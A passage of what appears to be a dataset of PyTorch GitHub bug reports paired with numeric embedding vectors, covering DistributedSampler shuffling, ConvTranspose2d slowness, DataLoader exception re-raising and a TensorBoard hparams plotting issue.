  2.31186181e-01  5.34881055e-02  1.96596533e-02 -3.08147639e-01
 -3.87436509e-01  2.03904495e-01  2.22242251e-02  1.77171618e-01
 -3.37340906e-02  7.77946711e-02 -2.10925579e-01  2.39307899e-02
 -1.72962695e-01 -6.73745126e-02 -5.37735559e-02 -2.69383695e-02
  1.08920738e-01 -5.00944614e-01 -4.04592082e-02 -6.70673177e-02
 -3.09155643e-01 -2.65437186e-01  1.95641130e-01 -1.88340098e-02
  2.23573089e-01  3.54128242e-01  9.13604200e-02 -1.32102489e-01
 -6.23867437e-02  1.14386193e-01  3.43614161e-01 -1.58798501e-01
 -8.00668970e-02 -4.12355140e-02 -7.17460215e-02  1.78710103e-01
  2.47062430e-01 -1.62317529e-01 -3.09450150e-01 -2.87445426e-01
  1.84255362e-01  2.97149241e-01  1.22744285e-01  1.95070088e-01
 -4.10111994e-03 -4.87831682e-02  1.27829835e-01 -1.02185290e-02
  1.05501913e-01  5.71920201e-02 -1.91774845e-01 -3.24278057e-01
 -2.31210485e-01  3.17182422e-01 -3.20129991e-01 -1.23804934e-01
 -2.00685337e-01 -1.28576428e-01 -3.33225846e-01  2.55793750e-01
 -6.70500547e-02  8.22832584e-02  4.18058038e-01  3.26128528e-02
 -1.54086530e-01 -9.76760834e-02  1.31797511e-02 -2.60531843e-01
  9.18921977e-02 -4.69037965e-02  1.90085679e-01 -1.06498506e-02
  1.34190723e-01 -1.50772959e-01 -2.96356440e-01 -2.57912874e-01
  3.04761410e-01  9.81300995e-02 -1.85481787e-01  1.35447681e-01
  2.36527532e-01 -1.43179059e-01  1.64989740e-01  5.10278232e-02
  6.47991523e-02 -1.27287865e-01 -2.18325164e-02 -2.32484713e-01
  2.03751996e-02 -7.69284889e-02 -1.95974618e-01  2.16709480e-01
 -1.69388086e-01 -1.66270927e-01 -4.21146870e-01 -2.61657387e-01
  5.15684485e-01 -1.90351680e-02  7.13649988e-02 -2.34111309e-01
  8.08786601e-03 -4.78533506e-02  1.54006064e-01 -5.15700467e-02
  2.14721426e-01  2.41050214e-01 -6.02479279e-02  4.16545361e-01
  1.88350111e-01  5.85739389e-02 -3.35826576e-01  7.42415339e-02
 -1.55529693e-01 -2.54189134e-01  3.54242593e-01  2.31937505e-03
  3.10693353e-01  8.38920567e-03  2.73892790e-01  9.07888114e-02
  1.77893788e-01 -2.41982996e-01 -1.87637314e-01  5.77778295e-02
  1.66473359e-01 -1.08987652e-01  4.32640575e-02  2.60373831e-01
  7.51227587e-02 -1.84560850e-01 -2.69816760e-02 -2.57269405e-02
 -2.07204163e-01 -1.23803683e-01 -2.93661147e-01  2.18283847e-01
  2.82001674e-01  6.18432797e-02 -1.14022523e-01  1.20378941e-01
  1.78134497e-02  1.09271154e-01  2.87959099e-01  7.19439983e-02
 -3.42303395e-01 -3.57004106e-02 -5.49580306e-02  4.56310883e-02
 -1.34941772e-01 -1.76458955e-02  9.52692926e-02  2.04472110e-01
  1.94280624e-01 -3.15795958e-01  3.18682909e-01 -2.02474780e-02
 -1.30997688e-01  4.57613878e-02 -2.02166378e-01  1.07310735e-01
 -2.70897895e-02  5.71981490e-01  1.38129085e-01  1.27096623e-01
 -1.11259967e-01 -1.90596543e-02 -1.38834238e-01  9.47193503e-02
  1.01831533e-01  1.18378818e-01 -8.40152204e-02 -8.69857892e-02
 -1.29540265e-03  6.74428791e-02  1.52187094e-01  2.49311384e-02
  7.15837404e-02 -6.54917676e-04  8.94224793e-02  1.44448310e-01
  9.54883844e-02  1.14467070e-01  2.58664787e-02 -9.46243778e-02
 -3.68429422e-02 -1.73853800e-01  1.12443417e-03 -3.72022092e-01
 -2.40713209e-01  1.03228856e-02  1.70384139e-01  4.77764070e-01
  6.03225976e-02  1.48949564e-01  2.24787503e-01  1.03169978e-01
 -1.16066158e-01 -1.70353986e-02 -1.96267545e-01  1.77899837e-01
  1.33835122e-01  3.99397872e-02 -3.45817842e-02  2.07506031e-01
 -3.55274498e-01 -1.36071697e-01 -4.79083121e-01 -3.23036388e-02
  1.04696870e-01 -1.80060208e-01 -5.34182563e-02 -1.74976587e-01
  6.52632117e-02  3.07518005e-01 -2.14490980e-01  1.32578447e-01
  4.12859581e-02  1.19803175e-01  2.44400114e-01  1.23432435e-01
  1.53630525e-01  3.35571319e-02  3.19713950e-01  3.03061008e-02
 -1.78489387e-01 -9.27756429e-02  1.74637049e-01 -9.73844975e-02]"
DistributedSampler can't shuffle the dataset high priority oncall: distributed module: dataloader triaged,"## ðŸ› Bug

<!-- A clear and concise description of what the bug is. -->
When using the torch.utils.data.distributed.DistributedSampler () function, the data set cannot be shuffled, and each epoch samples the data in the same order.

## To Reproduce

Steps to reproduce the behavior:
```python
import torch
import os
from torch.utils.data import Dataset, DataLoader
import numpy as np

os.environ[""CUDA_VISIBLE_DEVICES""] = ""0""

np.random.seed(5)

class RandomDataset(Dataset):
    def __init__(self):
        self.data = torch.rand(22, 1, 32, 32)
        self.name = torch.arange(1, 22)
        
    def __getitem__(self, idx):
        return self.name[idx], self.data[idx]
    
    def __len__(self):
        return len(self.data)
    

torch.distributed.init_process_group(backend=""nccl"")

dataset = RandomDataset()
sampler = torch.utils.data.distributed.DistributedSampler(dataset, shuffle=True) 
dataloader = DataLoader(dataset, 
    batch_size=5,   
    pin_memory=True, drop_last=True, sampler=sampler) 

for epoch in range(3):
    print(""epoch: "", epoch)
    for i, data in enumerate(dataloader, 0):
        names, _ = data
        print(names)
```

Run this code by executing:
```
python -m torch.distributed.launch --nproc_per_node=1 test.py
```

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior
Expect different data batch combinations for each epoch.
for example:
In epoch 1, My code prints:
tensor([10,  4, 15,  3, 11])
tensor([ 5,  9, 20, 19, 13])
tensor([ 2,  0, 18, 16,  7])
tensor([ 8,  6, 14, 17,  1])
In epoch 2, My code prints:
tensor([ 5,  9, 15,  3, 13])
tensor([10,  4, 20, 19, 11])
tensor([ 2,  14, 17, 0,  1])
tensor([ 8,  6, 18, 16,  7])
and so on.
<!-- A clear and concise description of what you expected to happen. -->
But now, the output is:
epoch:  1
tensor([10,  4, 15,  3, 11])
tensor([ 5,  9, 20, 19, 13])
tensor([ 2,  0, 18, 16,  7])
tensor([ 8,  6, 14, 17,  1])
epoch:  2
tensor([10,  4, 15,  3, 11])
tensor([ 5,  9, 20, 19, 13])
tensor([ 2,  0, 18, 16,  7])
tensor([ 8,  6, 14, 17,  1])

Every epoch, the names are the sameã€‚

## Environment

PyTorch version: 1.3.1+cu100
Is debug build: No
CUDA used to build PyTorch: 10.0.130

OS: Ubuntu 16.04.6 LTS
GCC version: (Ubuntu 6.5.0-2ubuntu1~16.04) 6.5.0 20181026
CMake version: version 3.5.1

Python version: 3.6
Is CUDA available: Yes
CUDA runtime version: 10.0.130
GPU models and configuration:
GPU 0: GeForce GTX 1080 Ti
GPU 1: GeForce GTX 1080 Ti
GPU 2: GeForce GTX 1080 Ti
GPU 3: GeForce GTX 1080 Ti

Nvidia driver version: 418.67
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5

Versions of relevant libraries:
[pip3] numpy==1.15.4
[conda] _tflow_select             2.3.0                       mkl
[conda] pytorch-wpe               0.0.0                    pypi_0    pypi
[conda] tensorflow                1.14.0          mkl_py36h2526735_0
[conda] tensorflow-base           1.14.0          mkl_py36h7ce6ba3_0
[conda] torch                     1.3.1+cu100              pypi_0    pypi
[conda] torch-complex             0.0.2                    pypi_0    pypi
[conda] warpctc-pytorch           0.1                      pypi_0    pypi
[conda] warpctc-pytorch10-cuda100 0.1.3                    pypi_0    pypi
[conda] warprnnt-pytorch          0.1                      pypi_0    pypi



Please copy and paste the output from our
[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)
(or fill out the checklist below manually).

You can get the script and run it with:
```
wget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py
# For security purposes, please check the contents of collect_env.py before running it.
python collect_env.py
```

 - PyTorch Version (e.g., 1.0):
 - OS (e.g., Linux):
 - How you installed PyTorch (`conda`, `pip`, source):
 - Build command you used (if compiling from source):
 - Python version:
 - CUDA/cuDNN version:
 - GPU models and configuration:
 - Any other relevant information:

## Additional context

<!-- Add any other context about the problem here. -->


cc @ezyang @gchanan @zou3519 @SsnL @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528",True,"[-2.95657456e-01 -2.55491763e-01 -2.24531442e-01 -2.12816671e-01
  9.79024470e-02 -1.69956744e-01 -1.21496908e-01 -6.87102228e-03
 -3.29980612e-01  1.15269743e-01 -9.49283242e-02  1.40122652e-01
  1.21632800e-01  3.66466343e-01 -2.00165480e-01  1.55131176e-01
 -2.14420646e-01 -1.78607047e-01 -3.28476489e-01  6.54930249e-04
  2.40016267e-01 -2.57055331e-02  1.35698438e-01 -2.47796223e-01
  5.44068404e-04  3.67383659e-01 -2.96277225e-01 -2.88489461e-01
  2.34501466e-01  1.01510465e-01  1.75156817e-02  1.23733990e-01
 -3.02818984e-01  1.27360761e-01 -7.47849047e-02 -2.89474409e-02
 -4.27341461e-01  1.78337973e-02 -1.26327142e-01  1.78624436e-01
  2.23815411e-01  2.41875172e-01 -2.73530744e-02  2.48163808e-02
 -3.65015507e-01  4.10208739e-02 -2.36385226e-01  3.18366438e-01
 -4.56047386e-01 -1.36083849e-02 -2.47937962e-01  2.27766484e-01
 -1.94399357e-01 -5.41034788e-02  7.43996799e-02 -1.23128369e-01
 -2.84488536e-02 -1.27120409e-03  4.75432836e-02 -1.09154642e-01
 -4.27030511e-02 -1.75067797e-01  3.96911278e-02  6.16138801e-02
  8.78253728e-02 -1.14113696e-01  7.32969046e-02  1.36317149e-01
  4.84380662e-01 -2.61722684e-01 -7.73613155e-02  1.97620839e-01
 -1.49315596e-01  8.98957402e-02 -1.48021411e-02 -3.39029022e-02
 -3.51221144e-01  9.03654844e-02 -9.11846161e-02 -1.68534875e-01
 -2.14933261e-01  1.82719946e-01 -6.75382465e-02  7.63720945e-02
 -3.08603607e-03 -3.38967621e-01  2.49565899e-01 -9.72442776e-02
  7.44884163e-02  3.97725344e-01  1.32048473e-01  2.14908123e-01
  7.45442733e-02  4.21375424e-01 -2.62723833e-01  3.71379316e-01
  1.93736017e-01  1.43555850e-02  9.72346067e-02 -1.89728141e-01
  3.38875316e-02 -5.06779075e-01 -1.01571657e-01  4.94473040e-01
  9.33700800e-02 -4.25523311e-01 -8.20256621e-02  1.11606322e-01
  1.08493082e-01  1.39112949e-01  1.58208758e-01  2.84588039e-01
  2.04971228e-02 -1.47957891e-01 -2.38830492e-01 -3.06475401e-01
 -2.34255925e-01  1.52470887e-01 -3.87135267e-01  6.32318854e-03
  1.89032733e-01 -8.30225497e-02 -1.47119770e-02  6.27859980e-02
  4.10396725e-01  1.97706133e-01  1.27777636e-01 -1.50184512e-01
 -1.28025502e-01 -9.53221619e-02  4.52089384e-02 -6.32991269e-02
 -1.79814219e-01 -3.14224839e-01  2.69727528e-01  4.61805224e-01
 -3.18900824e-01 -3.48024629e-03 -2.74353296e-01  2.48294324e-01
 -1.11511350e-02  1.28974780e-01 -4.72501218e-02 -2.57170051e-01
  1.54097542e-01  2.36429662e-01  3.76358926e-02  8.24916642e-03
  1.02295399e-01 -9.42854956e-02  1.08957604e-01 -3.61516356e-01
 -4.96240526e-01  6.03747815e-02 -6.73997626e-02 -6.96898922e-02
  4.20051217e-01  1.90514088e-01  3.28908533e-01 -1.14989370e-01
 -2.25045085e-01  2.11825699e-01 -6.02208562e-02 -1.95233181e-01
 -5.56468666e-02  3.38052958e-03  2.43798718e-02 -1.15016177e-02
 -2.60486871e-01 -9.01732370e-02 -2.33771354e-02 -2.67604053e-01
 -3.01826596e-01 -2.63342500e-01  9.59027335e-02 -9.12051089e-03
 -1.63560361e-02 -2.81246513e-01  1.72915161e-01 -6.89981282e-02
  5.65928280e-01  4.21877474e-01  2.12007344e-01  2.37142876e-01
  1.38364941e-01 -2.82896817e-01  3.03757131e-01  1.30336300e-01
 -2.26344004e-01 -3.37350965e-01 -2.95409977e-01 -1.19061522e-01
  6.31005704e-01 -6.12606071e-02  8.13410580e-02 -2.06057519e-01
  5.04386425e-02  7.71996453e-02  2.54213333e-01  9.44398269e-02
  1.10503193e-02  2.19940096e-01 -1.85736828e-03  1.26939602e-02
  1.78175777e-01  1.48040771e-01 -5.98454893e-01 -4.22665238e-01
 -1.44504070e-01  1.58432186e-01 -3.72603536e-01 -4.03737903e-01
 -2.15684354e-01 -8.62561911e-02  2.69439407e-02  2.02204421e-01
 -8.44347328e-02  1.67709574e-01  8.15336853e-02 -1.89965039e-01
  1.07206568e-01 -2.07349524e-01  1.71113312e-01 -1.78513303e-01
 -7.42533058e-02  3.88141751e-01 -1.88586205e-01  1.77700281e-01
  1.32318914e-01  9.61221382e-02 -1.36746317e-01  5.97278550e-02
  8.90179127e-02  1.29922464e-01 -3.97922337e-01  1.23891216e-02
 -6.35794699e-02  1.04626343e-01 -2.64187872e-01  1.21441074e-01
 -5.45948893e-02 -1.48516502e-02 -5.21293581e-02 -3.45889181e-01
 -2.66861618e-01  3.82773340e-01 -2.83511281e-01 -1.28477156e-01
 -1.97286889e-01 -1.66430756e-01 -2.34082431e-01  1.56951964e-01
  1.68148041e-01  7.98731446e-02  6.15690768e-01  7.64648616e-02
 -2.37585977e-03 -5.02614617e-01 -1.76627673e-02 -1.26343489e-01
  1.14004910e-02  2.39874035e-01  4.53827810e-03  6.71584487e-01
  1.87286243e-01 -3.07899892e-01 -3.24545860e-01  3.21240544e-01
  2.57730126e-01 -1.40962154e-01 -1.65250719e-01 -8.98378491e-02
  5.64572394e-01  2.26850122e-01  2.59977669e-01  1.35995880e-01
  3.88264477e-01 -1.13448083e-01  2.77850568e-01  1.16150849e-01
  2.48385258e-02  2.51270890e-01 -1.09792978e-01 -2.10376889e-01
  1.83256954e-01 -2.25933522e-01 -3.20446491e-01 -1.87235266e-01
 -2.73497343e-01  1.51115373e-01  8.91827047e-02 -1.83953732e-01
  2.68744826e-01  3.46927866e-02 -2.15554342e-01 -1.22425228e-01
  1.67261377e-01 -4.85938132e-01  3.44844013e-01  6.95233718e-02
 -2.72588804e-03  2.25354671e-01  6.82552978e-02  2.25517660e-01
 -1.65510103e-01  1.16272848e-02  3.05164754e-01 -8.25468153e-02
  2.46599764e-01 -3.24878573e-01  3.73532772e-01 -3.82340886e-02
 -8.19241703e-02  1.48721449e-02 -1.41490906e-01 -7.06465691e-02
 -1.48785189e-01  1.29864156e-01  2.03340486e-01  1.20597482e-02
  1.40767783e-01 -2.51417875e-01 -1.72583591e-02  2.38344595e-01
  3.47627252e-01  2.14414135e-01  7.44441152e-02  4.20479953e-01
 -1.45881087e-01  2.22641021e-01 -2.08550375e-02 -9.12751853e-02
  1.07124925e-01  1.97361737e-01  1.23823524e-01 -2.58315504e-01
 -1.07492238e-01  2.52623677e-01 -2.58751780e-01 -6.94721937e-02
  2.87924930e-02 -1.07649788e-01  1.03800055e-02 -1.34526715e-01
  8.25248659e-02 -2.06731372e-02  2.57167429e-01  2.35120952e-01
  5.46420813e-02 -3.79831120e-02 -1.18907109e-01 -2.41154432e-01
 -8.17745328e-02  1.77531898e-01 -1.56117827e-01  1.62891626e-01
 -1.42680764e-01 -4.78198491e-02  6.13791794e-02  1.21057473e-01
 -7.14810342e-02  4.43889588e-01 -1.46809399e-01  1.20863102e-01
 -1.91887859e-02  2.86714621e-02 -3.82220715e-01 -1.61461413e-01
  2.20619291e-01  3.83644164e-01 -3.73072445e-01  1.39746606e-01
  2.25488804e-02  1.90039039e-01  1.58707470e-01 -1.19395526e-02
  1.30076647e-01 -1.66597560e-01  1.71498537e-01  1.30018651e-01
 -9.74241793e-02  7.33492300e-02  3.36864442e-02 -2.27611274e-01]"
ConvTranspose2d much slower with output_padding set module: cudnn triaged,"## ðŸ› Bug

A `nn.ConvTranspose2d` can be up to two orders of magnitude slower when the `output_padding` option is set to a nonzero value then when it isn't.

## To Reproduce

```
class Test(nn.Module):
    def __init__(self, output_padding):
        super().__init__()
        
        self.c1 = nn.ConvTranspose2d(128, 64, kernel_size=3, stride=2,
                                     padding=1, output_padding=output_padding)
        self.c2 = nn.ConvTranspose2d(64, 32, kernel_size=3, stride=2,
                                     padding=1, output_padding=output_padding)
        self.c3 = nn.ConvTranspose2d(32, 3, kernel_size=3, stride=2,
                                     padding=1, output_padding=output_padding)
    def forward(self, x):
        x = self.c1(x)
        x = nn.functional.relu(x)
        x = self.c2(x)
        x = nn.functional.relu(x)
        x = self.c3(x)
        x = nn.functional.relu(x)
        return x

def test(output_padding):
    network = Test(output_padding=output_padding).cuda()
    x = torch.rand((1028, 128, 6, 6)).cuda()


    for i in range(5):
        start = time.time()
        for i in range(10):
            network(x)
        print((time.time() - start) / 10)

test((0, 0))
test((1, 1))
```

On my V100 machine, I get timings of about 0.0004s per forward pass with `output_padding=(0, 0)` and about .05s with `output_padding=(1, 1)`.

## Expected behavior

Given that the `output_padding` option has minimal effect on the number of FLOPs required to compute the function, I would expect the computation time to be similar with and without the option.



## Environment

PyTorch version: 1.3.1
Is debug build: No
CUDA used to build PyTorch: 10.1.243

OS: Ubuntu 16.04.6 LTS
GCC version: Could not collect
CMake version: Could not collect

Python version: 3.6
Is CUDA available: Yes
CUDA runtime version: 10.0.130
GPU models and configuration: GPU 0: Tesla V100-SXM2-16GB
Nvidia driver version: 418.87.00
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.2

Versions of relevant libraries:
[pip3] numpy==1.17.4
[pip3] torch==1.3.1
[pip3] torchcule==0.1.0
[pip3] torchvision==0.4.1
[conda] Could not collect


cc @csarofeen @ptrblck",True,"[-0.21099477 -0.07554853 -0.23849672 -0.03316425 -0.3099501  -0.24664775
  0.09651168  0.0641517  -0.32243782 -0.04290019 -0.06068491  0.20548564
  0.21028769  0.07243767 -0.32282168  0.337959   -0.2570073   0.12562013
  0.07785826  0.16412012  0.19985877 -0.1582124  -0.04691465  0.1357731
  0.26529205  0.02230565 -0.27554446  0.01382556  0.29525024  0.12677978
  0.06212939  0.1382373  -0.48954588  0.18619126 -0.02553803  0.2514027
 -0.44576824 -0.12314653 -0.0784374  -0.03991587  0.1055724   0.18184705
  0.17733696 -0.09160246  0.13902083  0.00503146 -0.09184999  0.22418156
 -0.10619073 -0.06991977  0.13815054  0.29844478 -0.230189   -0.27319348
  0.13201492 -0.11279693 -0.15626079 -0.26542586  0.02363535 -0.15576026
  0.0555177   0.03929634 -0.00476662  0.10165834 -0.04344588  0.06093612
  0.29199737  0.13978115  0.05773656 -0.01057386  0.387739    0.07425696
 -0.27050608  0.18273282  0.1942048  -0.1430122  -0.2553691   0.17670003
 -0.18637648 -0.21297759  0.22616068  0.1146549   0.11106719 -0.24956405
  0.11230308 -0.06657973  0.4096298  -0.16654465  0.2537671   0.14658646
  0.305759   -0.09424239 -0.4596008   0.31564665 -0.16433515  0.011854
  0.16912352  0.01962151 -0.19962054 -0.14550379 -0.12347668 -0.24557953
 -0.4207009   0.19047445  0.02094639 -0.00757976  0.05346292 -0.01171829
  0.03843117 -0.06502691  0.07723898 -0.20133372 -0.00392997  0.29118484
  0.18350892  0.26901436 -0.08044818  0.06031742 -0.10123686  0.23824516
  0.107147    0.21206862 -0.123158    0.20963481  0.4543163   0.16266908
  0.22961104 -0.08243786  0.1750603  -0.45239377  0.20651111  0.06384827
 -0.18166654  0.05214106 -0.0530053   0.03701305 -0.22347224 -0.12915128
 -0.1350615  -0.20580588 -0.16484159 -0.02061846 -0.04802978 -0.2084749
  0.31707355  0.01175988 -0.3015837   0.2146875  -0.00626262 -0.11717018
 -0.07927565  0.20416485 -0.5041372  -0.02054959 -0.08190396  0.1704155
  0.4399656  -0.14750506  0.07674056 -0.20865902  0.31008768  0.22084627
 -0.08876048  0.00623188  0.21853052  0.08566898  0.07726818 -0.00850122
 -0.3335271   0.10915118 -0.19652396 -0.17988719 -0.16659564 -0.35555914
  0.41619584 -0.03462098 -0.5387863  -0.35307866 -0.0900929   0.5905226
  0.2548036   0.34499794 -0.01443372  0.00898715  0.01440195 -0.19348797
 -0.12265369  0.22425199 -0.28100032  0.06856332 -0.17140591 -0.34638083
  0.02098081  0.10803697  0.23969589 -0.2652964   0.23140126 -0.03394549
  0.07280067 -0.11662211 -0.0811471  -0.16080496  0.34390044  0.0029673
  0.16264771 -0.05260001 -0.3459375  -0.34296882 -0.05864842  0.3688029
 -0.3606844  -0.13428071  0.2681316  -0.2765027  -0.20786704 -0.03133666
  0.32714087 -0.04401162 -0.04906475  0.18216214  0.1107027  -0.2629134
  0.08421094 -0.07993846  0.08928534  0.11689659 -0.16275737  0.34247372
 -0.01167868 -0.04753071 -0.0083033  -0.23334713  0.24466753 -0.03752822
  0.20441958  0.04955338 -0.06690077  0.02269661  0.20323546  0.20749399
 -0.4362368   0.07121757  0.17879096 -0.16796559  0.18513587  0.00383388
  0.11653791 -0.2206052  -0.34598824 -0.21398905 -0.19985922  0.08648057
  0.09087835 -0.22026274  0.2560648   0.08645046  0.05329576 -0.2344862
 -0.04122804 -0.02762714  0.12619607  0.20081294 -0.14151616  0.4851331
 -0.07060556 -0.013184   -0.3141945   0.01617261  0.30460843 -0.18589652
 -0.06871718 -0.26553774  0.60577303  0.12893826  0.4288195  -0.03440337
  0.1951289   0.11413442  0.04223616 -0.3876973  -0.2278752   0.22190481
 -0.05399646  0.29758918  0.12468401 -0.20401546 -0.23797356 -0.27543983
 -0.1164192  -0.0905967  -0.05237857  0.16937473  0.41938847 -0.11073326
 -0.33027422  0.23414207  0.34942925  0.00444282  0.04674999 -0.13539541
 -0.05743514  0.18556313  0.34886765 -0.13028069 -0.46112484  0.1778582
  0.33741128  0.05785023 -0.18176445 -0.26275826  0.37299776  0.20478147
 -0.2572313   0.21822265 -0.1263836   0.22016567  0.18551293  0.20594853
  0.05190694  0.23359026 -0.30717558 -0.21016553 -0.30909583  0.27559417
  0.09474553 -0.1000082  -0.04279166  0.10681878 -0.09833173 -0.06011387
  0.26033074  0.02377022 -0.08492669 -0.03916423  0.02751455 -0.23999605
 -0.06240225  0.27457538 -0.11536606 -0.33929402 -0.09370121 -0.08495231
  0.13865599 -0.22233626 -0.26459408 -0.33672565 -0.13542482  0.31768808
 -0.23445204  0.08589447  0.12011573  0.0048278  -0.17092508  0.05304191
  0.19841328  0.32181364  0.10421416  0.09813995 -0.12513877  0.4300337
 -0.29425192  0.06569229 -0.41592908 -0.1301756   0.0834365  -0.31351063
  0.16696468 -0.1192141   0.13691768 -0.32786772 -0.12537079  0.20053133
 -0.10334091 -0.05646969  0.26408634 -0.12596197 -0.20036736  0.05058499
  0.01999931 -0.04796027 -0.2778772   0.2011029  -0.07316469  0.11814959]"
DataLoader fails to re-raise exceptions with required arguments module: dataloader triaged,"## ðŸ› Bug
`torch.utils.data.DataLoader` attempts to relay exceptions from its child processes.  It fails to do this when the exception type takes multiple required arguments.

## To Reproduce

Run this:
```
import torch.utils.data
class E(Exception):
    def __init__(self, a, b):
        pass
    def __str__(self):
        return ""Special exception message""

class G(torch.utils.data.IterableDataset):
    def __iter__(self):
        raise E(a=1, b=2)
        yield 1
    
d = torch.utils.data.DataLoader(G(), num_workers=1)
next(iter(d))
```

The result:
```
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
  File ""/usr/local/miniconda3/envs/openai/lib/python3.7/site-packages/torch/utils/data/dataloader.py"", line 819, in __next__
    return self._process_data(data)
  File ""/usr/local/miniconda3/envs/openai/lib/python3.7/site-packages/torch/utils/data/dataloader.py"", line 846, in _process_data
    data.reraise()
  File ""/usr/local/miniconda3/envs/openai/lib/python3.7/site-packages/torch/_utils.py"", line 369, in reraise
    raise self.exc_type(msg)
TypeError: __init__() missing 1 required positional argument: 'b'
```

## Expected behavior

Should see the `E: Special exception message` printed. (This works when `num_workers=0`.)

## Environment
 - PyTorch Version (e.g., 1.0): 1.3.1
 - OS (e.g., Linux): Linux

cc @SsnL",True,"[-0.14238681 -0.16314527 -0.16399124 -0.07013273  0.1874749  -0.21333052
  0.08888941  0.05509118 -0.5896565   0.03948762 -0.04341784 -0.2508036
 -0.07586146  0.2832304  -0.08185866  0.3433076  -0.09367399  0.11031211
  0.07585461 -0.13039666  0.22842477 -0.1173213  -0.02896735 -0.18856475
 -0.2561732   0.24131185 -0.4702567  -0.01850016  0.17468233  0.07804559
 -0.00668206 -0.4188763  -0.6717731   0.16861281  0.33625913 -0.10222192
 -0.7107161  -0.30603898 -0.22668499  0.1000746   0.2887134  -0.11769615
 -0.22415039 -0.03434322 -0.5142783   0.09850228 -0.04847024  0.3146122
 -0.4713723   0.03588209 -0.12903073  0.08231646 -0.06172239 -0.21513487
  0.13207859 -0.35324758 -0.2719342   0.0222044   0.12893517  0.07036635
  0.18682137 -0.13473748  0.18538581 -0.29247153 -0.21183401 -0.18499175
 -0.09913644  0.19047743  0.8053414  -0.38616908  0.12359944  0.27434587
 -0.15498218  0.07029195 -0.0378599  -0.07897365 -0.56695855  0.13125376
 -0.46475515 -0.23671484  0.04916484  0.11153695 -0.15201944  0.00303723
  0.01682494 -0.11017347  0.08518662 -0.15035677  0.26152274  0.56683743
 -0.18092136  0.02481422  0.28376937  0.38951713  0.00628654  0.17363358
  0.09229279  0.1659067  -0.15676242 -0.41088653 -0.05444906 -0.7707319
 -0.36037886  0.5365892   0.23714212 -0.34457475 -0.04826905  0.28810936
  0.08865975 -0.34639576  0.11481389  0.20328312 -0.21596083 -0.35637915
 -0.36481506 -0.23391034 -0.53171414 -0.19550645 -0.30887294  0.12360521
  0.45900857  0.02625446 -0.05124987  0.02833678  0.66643244 -0.05831412
  0.03830651 -0.22654346 -0.01211952  0.03271845  0.21885414 -0.0223301
 -0.02154301 -0.36813095  0.13429488  0.4494031  -0.5490604  -0.02912445
 -0.22116706 -0.21333382 -0.04743963  0.22895333  0.16523331 -0.22291748
 -0.01229787  0.18385497  0.06775382  0.29444045  0.24777514  0.05920934
  0.27137595  0.10988718 -0.59178835  0.33104366 -0.14335488  0.02968002
  0.7151729   0.09123359  0.69120395 -0.36124766  0.27855983  0.33617482
  0.11348176 -0.20294607  0.4299559   0.01985334 -0.05808976  0.11961383
 -0.31111586  0.14239174 -0.20749891 -0.07145619  0.06298582 -0.42143273
  0.1307785  -0.19523747  0.10507739 -0.25719887  0.15841684  0.3154672
  0.5898588   0.402995    0.28025424 -0.06363557 -0.08898626  0.18060209
  0.0917788  -0.08149295  0.05988263 -0.3797365  -0.49227813 -0.16337654
  0.44624093  0.00146249  0.1309442   0.1526201   0.04869421 -0.256496
  0.22330579  0.02512277 -0.1170952  -0.09239885  0.00990709  0.0842369
  0.14441179  0.04982421 -0.3466987  -0.6560146  -0.22514123 -0.17750683
 -0.2988156  -0.08020848 -0.32405674 -0.05571732 -0.17152128 -0.17720577
 -0.25984406  0.11921844  0.2154543   0.06250944 -0.01631893  0.05992772
  0.18625496 -0.19354326  0.15675399  0.47692856 -0.15643251  0.09499632
  0.26355433  0.08559871  0.06602968 -0.2646643  -0.08331902  0.15041634
 -0.24220008  0.15322468  0.05506046 -0.02106049 -0.39202458 -0.01960459
 -0.25952685  0.02812423 -0.06271199 -0.21615998 -0.25981537  0.21663123
  0.13842294 -0.15203342 -0.17446032 -0.15294224 -0.22044413 -0.14840224
  0.18211976  0.06097212  0.4232152   0.4748142   0.1767343  -0.3694601
 -0.09352002 -0.20142423 -0.17674164  0.25454682  0.19351181  0.292459
  0.12899874 -0.16037713 -0.08806238 -0.09304935 -0.13339806 -0.02626434
  0.11036339 -0.05353511  0.53296375  0.36487913  0.15876731  0.07382181
  0.30150765 -0.0596966   0.21563521 -0.41250378  0.46273515  0.3087094
 -0.00841012  0.17123051  0.38557985 -0.11437531  0.04422274 -0.10949284
 -0.08821082  0.16592789 -0.00799009 -0.03304064  0.42781547 -0.03559641
 -0.4105789  -0.07191973  0.07512394 -0.5028198   0.18615684  0.23310867
 -0.45937377  0.12176989  0.20026147 -0.02705793 -0.2561609  -0.12404443
  0.35450715  0.06972423  0.57909286 -0.47973853  0.14096335 -0.09101603
 -0.3015696   0.5136373  -0.02230391 -0.05300473 -0.08527382  0.09550805
  0.07052073  0.02872236 -0.06338664 -0.3004536   0.05018888 -0.08969258
  0.21271975  0.28368592 -0.32517776  0.41774467  0.12618452  0.31322625
  0.23944828  0.00080619  0.39837283  0.15792783  0.05807954 -0.6122393
  0.01695601  0.42997736  0.21077564 -0.16434398 -0.19771978 -0.17559355
 -0.0247022  -0.08196478 -0.16520976 -0.1673109   0.09322765  0.38686204
 -0.2020728   0.12620816 -0.00782375 -0.2439281   0.35349602  0.20763315
 -0.10945154  0.6236313  -0.17576571  0.16020653 -0.19022271  0.08477972
  0.0530469   0.50906587 -0.26608926 -0.25514722 -0.05756586  0.0144767
 -0.27869698 -0.12339274  0.38056234  0.31631023 -0.41526914  0.04066879
 -0.20678654  0.37427294  0.48866403  0.20362559  0.3814178  -0.33589113
  0.19001907  0.20501786  0.23279576  0.16446383 -0.06619946 -0.00474876]"
[TensorBoard] add_hparams outputs undesired figures triaged module: tensorboard,"## ðŸ› Bug

The method `add_hparams` in tensorboard is amazing, however, sometimes it generates strange figures like the following figure:

<img width=""1439"" alt=""æˆªåœ– 2019-11-16 ä¸Šåˆ12 30 21"" src=""https://user-images.githubusercontent.com/33038038/68959176-8574b400-0808-11ea-9dcc-86c886f24bbf.png"">

The second figure in the bottom row shows that there are some gaps in loss and accuracy when the x-axis is batch_size, which is unexpected. It should look like the one showing accuracy v.s. lr.

BTW, the labels of the x-axis are hard to see if they are too close to each other. It is better to show them vertically.

## To Reproduce

